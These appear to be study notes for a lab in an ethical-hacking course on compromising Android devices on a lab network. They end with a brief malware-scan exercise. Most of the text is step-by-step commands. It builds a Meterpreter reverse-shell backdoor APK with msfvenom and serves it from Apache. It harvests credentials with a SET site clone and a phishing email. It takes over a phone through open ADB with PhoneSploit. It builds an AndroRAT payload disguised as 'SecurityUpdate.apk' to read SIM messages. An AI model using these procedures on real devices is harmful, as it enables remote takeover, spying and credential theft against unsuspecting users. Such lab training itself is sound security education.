# Lab 1: Hack Android Devices
## Task 1: Hack an Android Device by Creating Binary Payloads using Parrot Security
	sudo su
	cd
	service postgresql start
	msfvenom -p android/meterpreter/reverse_tcp --platform android -a dalvik LHOST=10.10.1.13 -R > Desktop/Backdoor.apk 
	mkdir /var/www/html/share
	chmod -R 755 /var/www/html/share
	chown -R www-data:www-data /var/www/html/share
	service apache2 start
	cp /root/Desktop/Backdoor.apk /var/www/html/share/
	msfconsole
	use exploit/multi/handler
	show options
	set LHOST 10.10.1.13
	exploit -i -z  -> run exploit as background job
	
	[Android]
	launch http://10.10.1.13/share
	download and run Backdoor.apk
	Chrome pop-up appears as shown in screenshot click on SETTINGS.Install unknown apps screen appears, Now turn on Allow from this source and click back.A MainActivity 
	screen appears; click Install.
	
	[parrot]
	The meterpreter session has been opened successfully
	sessions -i 1
	sysinfo
	ipconfig
	pwd
	cd /sdcard 
	pwd -> /storage/emulated/0.
	ps
	
	Note: Because of poor security settings and a lack of awareness, if an individual in an organization installs a backdoor file on their device, the attacker gains 
	control of the device. The attacker can then perform malicious activities such as uploading worms, downloading data, and spying on the user’s keystrokes, which can 
	reveal sensitive information related to the organization as well as the victim
	
	Close all windows
	
	[Android]
	Application -> MainActivity - App Info
	click UNINSTALL button to uninstall the application.
---
## Task 2: Harvest Users’ Credentials using the Social-Engineer Toolkit
	In this task, we will sniff user credentials on the Android platform using SET.
	[parrot]
	sudo su
	#setoolkit
	1 		-> Social Eng attacks
	2 		-> Website Attack Vector
	3 		-> Credential harvester attack method
	2       -> Site cloner
	Ip: 10.10.1.13
	URL to clone : http://certifiedhacker.com/Online%20Booking/index.html
	
	If a Press {return} if you understand what we’re saying here message appears, press Enter.
	
	Note: If a message appears asking Do you want to attempt to disable Apache?, type y and press Enter.
	Must now send the IP address of your Parrot Security machine to a victim and try to trick him/her into clicking on the link.
	Compose an email by encorporating fake link
	
	[Android]
	Open a link from the email, enter credentials
	
	[parrot]
	capture the credentials
---
## Task 3: Launch a DoS Attack on a Target machine using Low Orbit Ion Cannon (LOIC) on the Android Mobile Platform
---
## Task 4: Exploit the Android Platform through ADB using PhoneSploit
Android Debug Bridge (ADB) is a versatile command-line tool that lets you communicate with a device. ADB facilitates a variety of device actions such as installing and debugging apps, and provides access to a Unix shell that you can use to run several different commands on a device.

Usually, developers connect to ADB on Android devices by using a USB cable, but it is also possible to do so wirelessly by enabling a daemon server at TCP port 5555 on the device.
[parrot]
sudo su
cd PhoneSploit
python3 -m pip install colorama
python3 phonesploit.py
3  	-> Connect a new phone
Enter a phones ip address: 10.10.1.14
connection time out error :  Type 3 continue until u get Phone Ip address option
Connected at port 5555

	(main_menu)> 4  	-> Access Shell on a phone
	Device name: 10.10.1.14
	pwd		-> Root dir
	ls
	cd sdcard
	ls
	cd Download
	ls
	
	Note: Note down the location of images.jpeg (in this example, /sdcard/Download/images.jpeg). We will download this file in later steps.
	exit
	
	(main_menu)>7    ->Screen Shot a picture on a phone.
	10.10.1.14
	/home/attacker/Desktop		-> save, screen.png is stored in Desktop
	
	(main_menu)>14 	 ->list all apps on the phone
	10.10.1.14
	(main_menu)>15 	 ->choose Run an app
	com.android.calculator2
	
	[android]
	see that the calculator app is running, and that random values have been entered
---
## Task 5: Hack an Android Device by Creating APK File using AndroRAT
AndroRAT is a tool designed to give control of an Android system to a remote user and to retrieve information from it.

	[parrot]
	sudo su
	cd AndroidRat
	python3 androidRAT.py --build -i 10.10.1.13 -p 4444 -o SecurityUpdate.apk
		--build: is used for building the APK
		-i: specifies the local IP address (here, 10.10.1.13)
	cp /home/attacker/AndroidRAT/SecurityUpdate.apk /var/www/html/share
	service apache2 start
	python3 androidRAT.py --shell -i 0.0.0.0 -p 4444
		--shell: is used for getting the interpreter
		-i: specifies the IP address for listening (here, 0.0.0.0)
	
	[Android]
	launch http://10.10.1.13/share
	save and open SecurityUpdate.apk
	
	[parrot]
	Interpreter session has been opened successfully.
	help
	deviceinfo
	getSIM inbox
	getMACAddress
	exit
---
# Lab 2: Secure Android Devices using Various Android Security Tools
## Task 1: Analyze a Malicious App using Online Android Analyzers
	[Android]
	click Commands icon from the top-left corner of the screen, navigate to Power --> Reset/Reboot machine.
	Click Malwarebytes app
	Give permission
	Allow -> ask for permission
	skip -> already have subscription
	
	SCAN NOW - under Last device scan
	List teh threats found
	
	Remove selected
	
	On demand scan --> to view details of the scan.